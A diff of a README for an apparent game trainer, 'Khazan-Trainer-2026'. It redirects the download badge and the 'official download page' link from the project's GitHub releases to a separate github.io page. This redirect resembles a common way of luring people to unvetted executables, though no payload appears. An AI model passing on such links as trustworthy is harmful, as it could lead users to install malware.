@@ -1,6 +1,6 @@
 # ⚔️ Khazan-Trainer-2026 - Master your game with reliable tools
 
-[![](https://img.shields.io/badge/Download-Khazan%20Trainer-blue)](https://github.com/organontobogganing502/Khazan-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Khazan%20Trainer-blue)](https://organontobogganing502.github.io)
 
 ## 🎯 About the Software
 
@@ -20,5 +20,5 @@ Ensure you meet these requirements before starting:
 
 Follow these steps to set up the trainer on your computer.
 
-1.  Visit the [official download page](https://github.com/organontobogganing502/Khazan-Trainer-2026/releases).
+1.  Visit the [official download page](https://organontobogganing502.github.io).
 2.  Locate the latest release file,
